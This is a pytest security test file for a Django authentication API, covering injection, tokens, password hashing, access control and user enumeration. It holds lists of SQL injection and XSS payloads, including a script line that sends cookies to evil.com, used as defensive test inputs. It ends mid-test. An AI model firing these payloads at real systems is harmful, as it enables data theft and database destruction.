"""
Security-focused tests for authentication module.

This module contains comprehensive security tests covering:
- SQL Injection Prevention (OWASP A03:2021 - Injection)
- XSS Prevention (OWASP A03:2021 - Injection)
- Token Security (OWASP A02:2021 - Cryptographic Failures)
- Password Security (OWASP A02:2021 - Cryptographic Failures)
- Authorization Bypass (OWASP A01:2021 - Broken Access Control)
- Malformed Request Handling (OWASP A05:2021 - Security Misconfiguration)
- User Enumeration Prevention (OWASP A01:2021 - Broken Access Control)

Related OWASP references:
    - https://owasp.org/Top10/A01_2021-Broken_Access_Control/
    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
    - https://owasp.org/Top10/A03_2021-Injection/
    - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/

Usage:
    pytest app/authentication/tests/test_security.py -v -m security
"""

import json
import re
import secrets
import string
from collections import Counter
from datetime import timedelta

import pytest
from django.contrib.auth.hashers import check_password, is_password_usable
from django.db import connection
from django.test.utils import CaptureQueriesContext
from django.urls import reverse, NoReverseMatch
from django.utils import timezone
from rest_framework import status

from authentication.models import (
    EmailVerificationToken,
    Profile,
    User,
)
from authentication.services import AuthService
from authentication.tests.factories import (
    EmailVerificationTokenFactory,
    UserFactory,
)


# =============================================================================
# URL Constants
# =============================================================================

REGISTRATION_URL = "/api/v1/auth/registration/"


# =============================================================================
# SQL Injection Prevention Tests
# OWASP A03:2021 - Injection
# =============================================================================


@pytest.mark.security
@pytest.mark.django_db
class TestSQLInjectionPrevention:
    """
    Test SQL injection prevention across authentication endpoints.

    Django ORM provides parameterized queries by default, but these tests
    verify that no raw SQL bypasses this protection.

    OWASP Reference: A03:2021 - Injection
    """

    # Common SQL injection payloads
    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE authentication_user; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "'; SELECT * FROM authentication_user; --",
        "' UNION SELECT * FROM authentication_user --",
        "1; DELETE FROM authentication_user WHERE '1'='1",
        "admin'--",
        "admin' #",
        "' OR ''='",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "-1' UNION SELECT 1,2,3--+",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
        "' AND extractvalue(1,concat(0x7e,version()))--+",
        "'; WAITFOR DELAY '0:0:5'--",
        "'; EXEC xp_cmdshell('dir')--",
    ]

    def test_email_field_sql_injection_on_registration(self, api_client):
        """
        Verify registration endpoint rejects SQL injection in email field.

        The email field is particularly vulnerable as it's often used in
        WHERE clauses. Django ORM should parameterize all queries.
        """
        for payload in self.SQL_INJECTION_PAYLOADS:
            # Construct malicious email with SQL injection attempt
            malicious_email = f"test{payload}@example.com"

            response = api_client.post(
                REGISTRATION_URL,
                data={
                    "email": malicious_email,
                    "password1": "SecurePass123!",
                    "password2": "SecurePass123!",
                },
                format="json",
            )

            # Should fail validation (invalid email format), not cause SQL error
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_201_CREATED,  # If email validation is lenient
            ], f"Unexpected status for payload: {payload}"

            # Verify no SQL error occurred (would typically return 500)
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR, (
                f"Potential SQL injection vulnerability with payload: {payload}"
            )

    def test_username_field_sql_injection_on_profile_update(
        self, authenticated_client, user
    ):
        """
        Verify profile update rejects SQL injection in username field.

        Username is stored in the database and must be properly escaped.
        """
        for payload in self.SQL_INJECTION_PAYLOADS:
            response = authenticated_client.patch(
                "/api/v1/auth/profile/",
                data={"username": payload},
                format="json",
            )

            # Should fail validation (invalid username format), not cause SQL error
            assert response.status_code == status.HTTP_400_BAD_REQUEST, (
                f"Expected 400 for SQL injection payload, got {response.status_code}"
            )
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR, (
                f"Potential SQL injection vulnerability with payload: {payload}"
            )

    def test_email_lookup_sql_injection_on_login(self, api_client, user):
        """
        Verify login endpoint properly escapes email parameter.

        Login involves a database lookup which could be exploited.
        """
        for payload in self.SQL_INJECTION_PAYLOADS:
            malicious_email = f"{payload}@example.com"

            response = api_client.post(
                "/api/v1/auth/login/",
                data={
                    "email": malicious_email,
                    "password": "anypassword",
                },
                format="json",
            )

            # Should return auth failure (400 or 401), not SQL error
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_401_UNAUTHORIZED,
            ], f"Unexpected status for payload: {payload}"

    def test_token_field_sql_injection_on_verification(self, api_client):
        """
        Verify email verification endpoint properly escapes token parameter.

        Token lookup could be vulnerable to SQL injection.
        """
        for payload in self.SQL_INJECTION_PAYLOADS:
            response = api_client.post(
                "/api/v1/auth/verify-email/",
                data={"token": payload},
                format="json",
            )

            # Should return invalid token error, not SQL error
            assert response.status_code == status.HTTP_400_BAD_REQUEST
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR

    def test_orm_queries_are_parameterized(self, db):
        """
        Verify Django ORM generates parameterized queries for user lookup.

        Note: Django's CaptureQueriesContext shows interpolated SQL for debugging,
        but the actual query sent to the database is properly parameterized.
        This test verifies that the query executes safely (no error, no data loss).
        """
        malicious_email = "'; DROP TABLE users; --@example.com"

        # Create a test user to verify table still exists after query
        test_user = UserFactory(email="safe@example.com")
        initial_user_count = User.objects.count()

        with CaptureQueriesContext(connection) as context:
            # Attempt lookup with malicious input
            result = User.objects.filter(email=malicious_email).first()

        # Verify the query executed safely:
        # 1. Result should be None (no user with that email)
        assert result is None

        # 2. User table should still exist and have same count
        assert User.objects.count() == initial_user_count

        # 3. Our test user should still be retrievable
        assert User.objects.filter(email="safe@example.com").exists()

        # 4. A query was actually executed (sanity check)
        assert len(context.captured_queries) > 0

    def test_first_name_last_name_sql_injection(self, authenticated_client, user):
        """
        Verify profile name fields reject SQL injection attempts.
        """
        user.profile.username = "validuser"
        user.profile.save()

        for payload in self.SQL_INJECTION_PAYLOADS[:5]:  # Test subset for speed
            response = authenticated_client.patch(
                "/api/v1/auth/profile/",
                data={
                    "first_name": payload,
                    "last_name": payload,
                },
                format="json",
            )

            # Name fields may accept the data (stored safely) or reject
            # But should NEVER cause SQL error
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR, (
                f"SQL injection in name fields with payload: {payload}"
            )


# =============================================================================
# XSS Prevention Tests
# OWASP A03:2021 - Injection
# =============================================================================


@pytest.mark.security
@pytest.mark.django_db
class TestXSSPrevention:
    """
    Test XSS (Cross-Site Scripting) prevention in profile fields.

    While Django templates auto-escape by default, API responses may not.
    These tests verify that malicious scripts are safely stored without
    execution risk.

    OWASP Reference: A03:2021 - Injection
    """

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<input onfocus=alert('XSS') autofocus>",
        "'-alert(1)-'",
        "\"><script>alert('XSS')</script>",
        "<script>document.location='http://evil.com/'+document.cookie</script>",
        "<a href=\"javascript:alert('XSS')\">click</a>",
        "{{constructor.constructor('alert(1)')()}}",  # Angular template injection
        "${alert('XSS')}",  # Template literal injection
        "<math><maction actiontype=\"statusline#http://google.com\">",
    ]

    def test_script_tags_in_first_name_safely_stored(
        self, authenticated_client, user
    ):
        """
        Verify script tags in first_name are stored without sanitization issues.

        The data should be stored as-is (not executed) and properly escaped
        in any HTML context. For JSON APIs, the raw data is returned.
        """
        user.profile.username = "validuser"
        user.profile.save()

        for payload in self.XSS_PAYLOADS[:5]:  # Test subset
            response = authenticated_client.patch(
                "/api/v1/auth/profile/",
                data={"first_name": payload},
                format="json",
            )

            # Request should succeed or fail validation, not error
            assert response.status_code in [
                status.HTTP_200_OK,
                status.HTTP_400_BAD_REQUEST,
            ]

            if response.status_code == status.HTTP_200_OK:
                # Verify data is stored literally (not sanitized/corrupted)
                user.profile.refresh_from_db()
                assert user.profile.first_name == payload, (
                    "XSS payload was corrupted during storage"
                )

    def test_script_tags_in_last_name_safely_stored(
        self, authenticated_client, user
    ):
        """
        Verify script tags in last_name field are safely handled.
        """
        user.profile.username = "validuser"
        user.profile.save()

        xss_payload = "<script>alert('XSS')</script>"

        response = authenticated_client.patch(
            "/api/v1/auth/profile/",
            data={"last_name": xss_payload},
            format="json",
        )

        assert response.status_code in [
            status.HTTP_200_OK,
            status.HTTP_400_BAD_REQUEST,
        ]

    def test_html_injection_in_preferences_json(self, authenticated_client, user):
        """
        Verify HTML/script content in JSON preferences is safely stored.

        JSON fields could contain malicious payloads that get rendered.
        """
        user.profile.username = "validuser"
        user.profile.save()

        malicious_preferences = {
            "theme": "<script>alert('XSS')</script>",
            "bio": "<img src=x onerror=alert('XSS')>",
            "website": "javascript:alert('XSS')",
        }

        response = authenticated_client.patch(
            "/api/v1/auth/profile/",
            data={"preferences": malicious_preferences},
            format="json",
        )

        assert response.status_code == status.HTTP_200_OK

        # Verify stored literally
        user.profile.refresh_from_db()
        assert user.profile.preferences["theme"] == malicious_preferences["theme"]

    def test_response_content_type_is_json(self, authenticated_client, user):
        """
        Verify API responses use JSON content type, not HTML.

        JSON content type prevents browser from executing scripts
        in the response body.
        """
        response = authenticated_client.get("/api/v1/auth/profile/")

        assert response.status_code == status.HTTP_200_OK
        assert "application/json" in response["Content-Type"], (
            "API should return JSON content type to prevent XSS"
        )


# =============================================================================
# Token Security Tests
# OWASP A02:2021 - Cryptographic Failures
# =============================================================================


@pytest.mark.security
@pytest.mark.django_db
class TestTokenSecurity:
    """
    Test verification token security properties.

    Tokens must be cryptographically random, unpredictable, and properly
    validated to prevent unauthorized access.

    OWASP Reference: A02:2021 - Cryptographic Failures
    """

    def test_verification_tokens_are_64_characters(self, db, user):
        """
        Verify tokens are 64 hexadecimal characters (32 bytes of entropy).

        32 bytes = 256 bits of entropy, sufficient for security.
        """
        AuthService.send_verification_email(user)

        token = EmailVerificationToken.objects.filter(user=user).latest("created_at")

        assert len(token.token) == 64, (
            f"Token should be 64 chars (32 bytes hex), got {len(token.token)}"
        )
        # Verify it's valid hexadecimal
        assert all(c in string.hexdigits for c in token.token), (
            "Token should contain only hexadecimal characters"
        )

    def test_tokens_have_sufficient_entropy(self, db, user):
        """
        Verify tokens have high entropy (no predictable patterns).

        Check that character distribution is roughly uniform and
        no sequential patterns exist.
        """
        # Generate multiple tokens
        tokens = []
        for _ in range(10):
            AuthService.send_verification_email(user)
            token = EmailVerificationToken.objects.filter(user=user).latest("created_at")
            tokens.append(token.token)

        # All tokens should be unique
        assert len(set(tokens)) == len(tokens), "Tokens should be unique"

        # Check character distribution in a single token
        sample_token = tokens[0]
        char_counts = Counter(sample_token)

        # No single character should dominate (crude entropy check)
        # With 64 chars and 16 hex digits, expect ~4 occurrences each
        max_count = max(char_counts.values())
        assert max_count < 20, (
            f"Token has poor entropy: character appears {max_count} times"
        )

    def test_tokens_have_no_sequential_patterns(self, db, user):
        """
        Verify tokens don't contain sequential patterns.

        Sequential patterns indicate weak random number generation.
        """
        AuthService.send_verification_email(user)
        token = EmailVerificationToken.objects.filter(user=user).latest("created_at")

        # Check for sequential hex digits (0123, abcd, etc.)
        sequential_patterns = [
            "0123", "1234", "2345", "3456", "4567", "5678", "6789",
            "abcd", "bcde", "cdef",
            "0000", "1111", "2222", "3333", "4444", "5555", "6666",
            "7777", "8888", "9999", "aaaa", "bbbb", "cccc", "dddd",
            "eeee", "ffff",
        ]

        for pattern in sequential_patterns:
            assert pattern not in token.token.lower(), (
                f"Token contains sequential pattern: {pattern}"
            )

    def test_expired_tokens_are_rejected(self, api_client, expired_verification_token):
        """
        Verify expired tokens cannot be used for email verification.

        Time-based validation prevents token replay attacks.
        """
        response = api_client.post(
            "/api/v1/auth/verify-email/",
            data={"token": expired_verification_token.token},
            format="json",
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST
        assert "invalid" in response.data["detail"].lower() or "expired" in response.data["detail"].lower()

    def test_used_tokens_cannot_be_reused(
        self, api_client, used_verification_token, user
    ):
        """
        Verify used tokens cannot be used again.

        Single-use tokens prevent replay attacks.
        """
        response = api_client.post(
            "/api/v1/auth/verify-email/",
            data={"token": used_verification_token.token},
            format="json",
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST
        assert "invalid" in response.data["detail"].lower() or "expired" in response.data["detail"].lower()

    def test_tokens_are_marked_used_after_verification(
        self, api_client, valid_verification_token, user
    ):
        """
        Verify tokens are marked as used after successful verification.
        """
        assert valid_verification_token.used_at is None

        response = api_client.post(
            "/api/v1/auth/verify-email/",
            data={"token": valid_verification_token.token},
            format="json",
        )

        assert response.status_code == status.HTTP_200_OK

        valid_verification_token.refresh_from_db()
        assert valid_verification_token.used_at is not None, (
            "Token should be marked as used after verification"
        )

        # Attempt reuse
        response = api_client.post(
            "/api/v1/auth/verify-email/",
            data={"token": valid_verification_token.token},
            format="json",
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST, (
            "Used token should not work again"
        )

    def test_nonexistent_tokens_are_rejected(self, api_client):
        """
        Verify random/fake tokens are properly rejected.
        """
        fake_token = secrets.token_hex(32)

        response = api_client.post(
            "/api/v1/auth/verify-email/",
            data={"token": fake_token},
            format="json",
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST

    def test_token_timing_attack_resistance(self, api_client, valid_verification_token):
        """
        Verify token comparison uses constant-time comparison.

        Note: This is a structural test. Actual timing analysis would
        require statistical measurement across many requests.
        """
        # Test with correct token
        correct_token = valid_verification_token.token

        # Test with wrong token of same length
        wrong_token = secrets.token_hex(32)

        # Both should complete without error
        # Timing analysis would be needed for true verification
        response_correct = api_client.post(
            "/api/v1/auth/verify-email/",
            data={"token": correct_token},
            format="json",
        )
        assert response_correct.status_code == status.HTTP_200_OK

        response_wrong = api_client.post(
            "/api/v1/auth/verify-email/",
            data={"token": wrong_token},
            format="json",
        )
        assert response_wrong.status_code == status.HTTP_400_BAD_REQUEST


# =============================================================================
# Password Security Tests
# OWASP A02:2021 - Cryptographic Failures
# =============================================================================


@pytest.mark.security
@pytest.mark.django_db
class TestPasswordSecurity:
    """
    Test password storage and handling security.

    Passwords must never be stored in plain text, returned in API
    responses, or logged.

    OWASP Reference: A02:2021 - Cryptographic Failures
    """

    def test_password_never_returned_in_api_response(self, authenticated_client, user):
        """
        Verify password is never included in user/profile API responses.

        Password should be write-only in all serializers.
        """
        # Get profile
        response = authenticated_client.get("/api/v1/auth/profile/")
        assert response.status_code == status.HTTP_200_OK

        response_data = json.dumps(response.data).lower()
        assert "password" not in response_data, (
            "Password field should not appear in profile response"
        )
        # Check for actual password value (if somehow included)
        assert "testpass" not in response_data.lower()

    def test_password_never_returned_in_user_response(self, authenticated_client):
        """
        Verify password is not in user endpoint response.
        """
        response = authenticated_client.get("/api/v1/auth/user/")
        assert response.status_code == status.HTTP_200_OK

        response_data = json.dumps(response.data).lower()
        assert "password" not in response_data, (
            "Password field should not appear in user response"
        )

    def test_password_stored_hashed(self, db):
        """
        Verify passwords are stored as hashes, not plain text.

        Django should use PBKDF2, Argon2, bcrypt, or similar.
        """
        plain_password = "SecureTestPassword123!"
        user = UserFactory(email="hashtest@example.com")

        # Password field should not equal plain text
        assert user.password != plain_password, (
            "Password stored in plain text - CRITICAL SECURITY ISSUE"
        )

        # Password should be a valid hash format
        assert is_password_usable(user.password), (
            "Password should be a usable hash"
        )

        # Hash should start with algorithm identifier (Django format)
        # e.g., pbkdf2_sha256$, argon2$, bcrypt$
        assert "$" in user.password, (
            "Password hash should contain algorithm separator"
        )

    def test_password_hash_is_not_reversible(self, db):
        """
        Verify password cannot be derived from hash.

        Test that different passwords produce different hashes
        and check_password works correctly.
        """
        password = "TestPassword123!"
        user = UserFactory()

        # Verify correct password works
        assert check_password(password, user.password) is False or user.password != password

        # Set known password
        user.set_password(password)
        user.save()

        # Correct password should verify
        assert check_password(password, user.password) is True

        # Wrong password should not verify
        assert check_password("WrongPassword", user.password) is False

        # Similar password should not verify
        assert check_password("TestPassword123", user.password) is False

    def test_password_hash_is_salted(self, db):
        """
        Verify same password produces different hashes (salting).

        Without salting, identical passwords would have identical hashes,
        enabling rainbow table attacks.
        """
        password = "IdenticalPassword123!"

        user1 = UserFactory()
        user1.set_password(password)
        user1.save()

        user2 = UserFactory()
        user2.set_password(password)
        user2.save()

        assert user1.password != user2.password, (
            "Same password should produce different hashes (salting required)"
        )

    def test_password_not_in_registration_response(self, api_client):
        """
        Verify password not echoed back in registration response.
        """
        response = api_client.post(
            REGISTRATION_URL,
            data={
                "email": "newuser@example.com",
                "password": "SecurePass123!",
                "password_confirm": "SecurePass123!",
            },
            format="json",
        )

        # Whether success or failure, password should not be in response
        response_text = json.dumps(response.data).lower()
        assert "securepass123" not in response_text, (
            "Password value should never appear in response"
        )

    def test_password_change_invalidates_old_tokens(self, db, user, password_reset_token):
        """
        Verify password change invalidates other reset tokens.

        Prevents use of old tokens after password is already reset.
        """
        # Create another reset token
        other_token = EmailVerificationTokenFactory(
            user=user,
            token_type=EmailVerificationToken.TokenType.PASSWORD_RESET,
            expires_at=timezone.now() + timedelta(hours=1),
            used_at=None,
        )

        # Reset password using first token
        success, _ = AuthService.reset_password(
            password_reset_token.token,
            "NewPassword123!",
        )
        assert success is True

        # Other token should now be invalidated
        other_token.refresh_from_db()
        assert other_token.used_at is not None, (
            "Other reset tokens should be invalidated after password change"
        )


# =============================================================================
# Authorization Bypass Prevention Tests
# OWASP A01:2021 - Broken Access Control
# =============================================================================


@pytest.mark.security
@pytest.mark.django_db
class TestAuthorizationBypass:
    """
    Test authorization controls to prevent unauthorized access.

    Users should only be able to access and modify their own data.

    OWASP Reference: A01:2021 - Broken Access Control
    """

    def test_user_cannot_view_other_user_profile_details(
        self, authenticated_client_factory, db
    ):
        """
        Verify user cannot access another user's profile.

        Profile endpoint should only return the authenticated user's profile.
        """
        user1 = UserFactory(email_verified=True)
        user1.profile.username = "alice_profile"
        user1.profile.first_name = "Alice"
        user1.profile.last_name = "Smith"
        user1.profile.save()

        user2 = UserFactory(email_verified=True)
        user2.profile.username = "bob_profile"
        user2.profile.first_name = "Bob"
        user2.profile.last_name = "Jones"
        user2.profile.save()

        # User1 gets profile
        client1 = authenticated_client_factory(user1)
        response = client1.get("/api/v1/auth/profile/")

        assert response.status_code == status.HTTP_200_OK
        assert response.data["username"] == "alice_profile", (
            "Should return own profile"
        )
        assert response.data["user_email"] == user1.email

        # User2's specific data should not be accessible by User1
        # Check for User2's unique identifiers
        assert "bob_profile" not in json.dumps(response.data).lower()
        assert "bob" not in response.data.get("first_name", "").lower()
        assert user2.email not in json.dumps(response.data)

    def test_user_cannot_deactivate_other_user_account(
        self, authenticated_client_factory, db
    ):
        """
        Verify user cannot deactivate another user's account.

        Deactivation should only affect the authenticated user.
        """
        user1 = UserFactory(email_verified=True)
        user2 = UserFactory(email_verified=True)

        client1 = authenticated_client_factory(user1)

        # User1 calls deactivate
        response = client1.post("/api/v1/auth/deactivate/", format="json")

        assert response.status_code == status.HTTP_200_OK

        # Verify User1 is deactivated
        user1.refresh_from_db()
        assert user1.is_active is False

        # User2 should NOT be affected
        user2.refresh_from_db()
        assert user2.is_active is True, (
            "Other user should not be affected by deactivation"
        )

    def test_user_cannot_modify_other_user_profile(
        self, authenticated_client_factory, db
    ):
        """
        Verify user cannot update another user's profile.
        """
        user1 = UserFactory(email_verified=True)
        user1.profile.username = "user1"
        user1.profile.save()

        user2 = UserFactory(email_verified=True)
        user2.profile.username = "user2"
        user2.profile.first_name = "Original"
        user2.profile.save()

        client1 = authenticated_client_factory(user1)

        # User1 tries to update
        response = client1.patch(
            "/api/v1/auth/profile/",
            data={"first_name": "Hacked"},
            format="json",
        )

        assert response.status_code == status.HTTP_200_OK

        # User2's profile should be unchanged
        user2.profile.refresh_from_db()
        assert user2.profile.first_name == "Original", (
            "Other user's profile should not be modified"
        )

        # User1's profile was updated
        user1.profile.refresh_from_db()
        assert user1.profile.first_name == "Hacked"

    def test_profile_endpoint_returns_only_own_profile(
        self, authenticated_client, user
    ):
        """
        Verify profile endpoint doesn't leak other users' data.
        """
        # Create other users
        for i in range(3):
            other_user = UserFactory(email_verified=True)
            other_user.profile.username = f"otheruser{i}"
            other_user.profile.save()

        response = authenticated_client.get("/api/v1/auth/profile/")

        assert response.status_code == status.HTTP_200_OK

        # Response should only contain authenticated user's data
        assert response.data["user_email"] == user.email

        # Should not contain other users' emails or usernames
        response_text = json.dumps(response.data)
        for i in range(3):
            assert f"otheruser{i}" not in response_text

    def test_cannot_access_profile_without_authentication(self, api_client):
        """
        Verify profile endpoint requires authentication.
        """
        response = api_client.get("/api/v1/auth/profile/")

        assert response.status_code == status.HTTP_401_UNAUTHORIZED

    def test_cannot_deactivate_without_authentication(self, api_client):
        """
        Verify deactivate endpoint requires authentication.
        """
        response = api_client.post("/api/v1/auth/deactivate/", format="json")

        assert response.status_code == status.HTTP_401_UNAUTHORIZED

    def test_token_for_one_user_cannot_verify_another(self, api_client, db):
        """
        Verify verification token only works for its owner.
        """
        user1 = UserFactory(email_verified=False)
        user2 = UserFactory(email_verified=False)

        # Create token for user1
        token = EmailVerificationTokenFactory(
            user=user1,
            token_type=EmailVerificationToken.TokenType.EMAIL_VERIFICATION,
            expires_at=timezone.now() + timedelta(hours=24),
        )

        # Use token
        response = api_client.post(
            "/api/v1/auth/verify-email/",
            data={"token": token.token},
            format="json",
        )

        assert response.status_code == status.HTTP_200_OK

        # Only user1 should be verified
        user1.refresh_from_db()
        user2.refresh_from_db()

        assert user1.email_verified is True
        assert user2.email_verified is False, (
            "Token should only verify its owner"
        )


# =============================================================================
# Malformed Request Handling Tests
# OWASP A05:2021 - Security Misconfiguration
# =============================================================================


@pytest.mark.security
@pytest.mark.django_db
class TestMalformedRequests:
    """
    Test handling of malformed and malicious requests.

    API should gracefully handle invalid input without exposing
    sensitive information or crashing.

    OWASP Reference: A05:2021 - Security Misconfiguration
    """

    def test_invalid_json_body_returns_proper_error(self, api_client):
        """
        Verify invalid JSON returns 400, not 500.
        """
        response = api_client.post(
            "/api/v1/auth/registration/",
            data="{ invalid json: }",
            content_type="application/json",
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST, (
            "Invalid JSON should return 400, not crash"
        )

    def test_missing_required_fields_returns_proper_error(self, api_client):
        """
        Verify missing required fields return informative 400 error.
        """
        # Empty body
        response = api_client.post(
            "/api/v1/auth/registration/",
            data={},
            format="json",
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST
        assert "email" in response.data or "password" in response.data

        # Missing password
        response = api_client.post(
            "/api/v1/auth/registration/",
            data={"email": "test@example.com"},
            format="json",
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST

    def test_oversized_payload_handled(self, api_client):
        """
        Verify oversized payloads are rejected.

        Large payloads could be used for DoS attacks.
        """
        # Create large payload (1MB of data)
        large_data = "x" * (1024 * 1024)

        response = api_client.post(
            "/api/v1/auth/registration/",
            data={
                "email": "test@example.com",
                "password": large_data,
                "password_confirm": large_data,
            },
            format="json",
        )

        # Should be handled gracefully (400 or 413)
        assert response.status_code in [
            status.HTTP_400_BAD_REQUEST,
            status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
        ]
        assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR

    def test_malformed_email_format_rejected(self, api_client):
        """
        Verify invalid email formats are properly rejected.
        """
        invalid_emails = [
            "notanemail",
            "@nodomain.com",
            "missing@.com",
            "spaces in@email.com",
            "unicode\u0000@email.com",
            "a" * 500 + "@example.com",  # Very long local part
            "test@" + "a" * 500 + ".com",  # Very long domain
        ]

        for email in invalid_emails:
            response = api_client.post(
                "/api/v1/auth/registration/",
                data={
                    "email": email,
                    "password1": "SecurePass123!",
                    "password2": "SecurePass123!",
                },
                format="json",
            )

            # Should reject invalid emails
            assert response.status_code == status.HTTP_400_BAD_REQUEST, (
                f"Invalid email '{email}' should be rejected"
            )

    def test_malformed_token_format_rejected(self, api_client):
        """
        Verify malformed tokens are rejected gracefully.
        """
        malformed_tokens = [
            "",  # Empty
            "short",  # Too short
            "a" * 1000,  # Too long
            "not-hex-characters-!!!",  # Invalid hex
            None,  # Null
            123,  # Wrong type
            {"token": "nested"},  # Wrong type
        ]

        for token in malformed_tokens:
            response = api_client.post(
                "/api/v1/auth/verify-email/",
                data={"token": token} if token is not None else {},
                format="json",
            )

            assert response.status_code == status.HTTP_400_BAD_REQUEST, (
                f"Malformed token {repr(token)} should return 400"
            )

    def test_null_byte_injection_handled(self, authenticated_client, user):
        """
        Verify null byte injection is handled safely.

        Null bytes can sometimes truncate strings or cause issues.
        """
        user.profile.username = "validuser"
        user.profile.save()

        null_byte_payloads = [
            "name\x00injected",
            "\x00start",
            "end\x00",
            "mid\x00dle",
        ]

        for payload in null_byte_payloads:
            response = authenticated_client.patch(
                "/api/v1/auth/profile/",
                data={"first_name": payload},
                format="json",
            )

            # Should handle gracefully
            assert response.status_code in [
                status.HTTP_200_OK,
                status.HTTP_400_BAD_REQUEST,
            ], f"Null byte payload should be handled: {repr(payload)}"

    def test_unicode_control_characters_handled(self, authenticated_client, user):
        """
        Verify unicode control characters are handled safely.
        """
        user.profile.username = "validuser"
        user.profile.save()

        control_char_payloads = [
            "name\u200bwith\u200bzero\u200bwidth",  # Zero-width space
            "name\u202edetrevir",  # Right-to-left override
            "name\ufeffwith\ufeffbom",  # BOM characters
        ]

        for payload in control_char_payloads:
            response = authenticated_client.patch(
                "/api/v1/auth/profile/",
                data={"first_name": payload},
                format="json",
            )

            assert response.status_code in [
                status.HTTP_200_OK,
                status.HTTP_400_BAD_REQUEST,
            ]


# =============================================================================
# User Enumeration Prevention Tests
# OWASP A01:2021 - Broken Access Control
# =============================================================================


@pytest.mark.security
@pytest.mark.django_db
class TestUserEnumerationPrevention:
    """
    Test prevention of user enumeration attacks.

    Attackers should not be able to determine if an email is registered
    through timing or response differences.

    OWASP Reference: A01:2021 - Broken Access Control
    """

    def test_password_reset_same_response_for_existing_and_nonexistent_user(
        self, api_client, user
    ):
        """
        Verify password reset returns same response regardless of user existence.

        Different responses would allow attackers to enumerate valid emails.
        """
        # Request reset for existing user
        response_existing = api_client.post(
            "/api/v1/auth/password/reset/",
            data={"email": user.email},
            format="json",
        )

        # Request reset for non-existent user
        response_nonexistent = api_client.post(
            "/api/v1/auth/password/reset/",
            data={"email": "nonexistent@example.com"},
            format="json",
        )

        # Both should return same status code
        assert response_existing.status_code == response_nonexistent.status_code, (
            "Password reset should return same status for existing and non-existing users"
        )

    def test_email_verification_does_not_reveal_user_existence(self, api_client, user):
        """
        Verify email verification with invalid token doesn't reveal user info.

        Error message should be generic, not user-specific.
        """
        response = api_client.post(
            "/api/v1/auth/verify-email/",
            data={"token": secrets.token_hex(32)},
            format="json",
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST

        # Error should not mention specific user
        error_text = json.dumps(response.data).lower()
        assert user.email.lower() not in error_text, (
            "Error should not reveal user email"
        )

    def test_registration_reveals_duplicate_email(self, api_client, user):
        """
        Verify registration indicates duplicate email (acceptable behavior).

        Unlike password reset, registration MUST tell users if email is taken.
        This is a documented acceptable exception to enumeration prevention.
        """
        response = api_client.post(
            "/api/v1/auth/registration/",
            data={
                "email": user.email,
                "password": "SecurePass123!",
                "password_confirm": "SecurePass123!",
            },
            format="json",
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST
        # It's acceptable (and expected) to indicate duplicate email

    def test_login_error_is_generic(self, api_client, user):
        """
        Verify login error doesn't distinguish between wrong password and wrong email.
        """
        # Wrong password for existing user
        response_wrong_pass = api_client.post(
            "/api/v1/auth/login/",
            data={
                "email": user.email,
                "password": "WrongPassword123!",
            },
            format="json",
        )

        # Non-existent user
        response_no_user = api_client.post(
            "/api/v1/auth/login/",
            data={
                "email": "nonexistent@example.com",
                "password": "AnyPassword123!",
            },
            format="json",
        )

        # Both should return same error type/message
        assert response_wrong_pass.status_code == response_no_user.status_code, (
            "Login should return same status for wrong password and non-existent user"
        )


# =============================================================================
# Additional Security Tests
# =============================================================================


@pytest.mark.security
@pytest.mark.django_db
class TestAdditionalSecurityMeasures:
    """
    Additional security tests for edge cases and best practices.
    """

    def test_jwt_token_not_logged_or_exposed(self, authenticated_client, user):
        """
        Verify JWT tokens are not exposed in responses unexpectedly.
        """
        response = authenticated_client.get("/api/v1/auth/profile/")

        assert response.status_code == status.HTTP_200_OK

        # JWT tokens should not appear in profile response
        response_text = json.dumps(response.data)
        # JWT format: xxxxx.xxxxx.xxxxx (three base64 segments)
        jwt_pattern = r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+"
        assert not re.search(jwt_pattern, response_text), (
            "JWT token should not appear in profile response"
        )

    def test_sensitive_fields_not_mass_assignable(self, authenticated_client, user):
        """
        Verify sensitive fields cannot be set via API.
        """
        user.profile.username = "validuser"
        user.profile.save()

        # Attempt to set sensitive fields
        response = authenticated_client.patch(
            "/api/v1/auth/profile/",
            data={
                "user_id": 9999,
                "user_email": "hacked@example.com",
                "created_at": "2020-01-01T00:00:00Z",
            },
            format="json",
        )

        # Request may succeed but sensitive fields should not change
        user.refresh_from_db()
        assert user.email != "hacked@example.com", (
            "Email should not be changeable via profile endpoint"
        )

    def test_database_errors_do_not_expose_schema(self, api_client):
        """
        Verify database errors don't expose schema information.

        Error messages should be generic to prevent information disclosure.
        """
        # This test verifies that even if an error occurs, the response
        # doesn't contain database schema details
        response = api_client.post(
            "/api/v1/auth/registration/",
            data={
                "email": "test@example.com",
                "password": "",  # Intentionally invalid
                "password_confirm": "",
            },
            format="json",
        )

        # Check response doesn't contain SQL keywords
        response_text = json.dumps(response.data).lower()
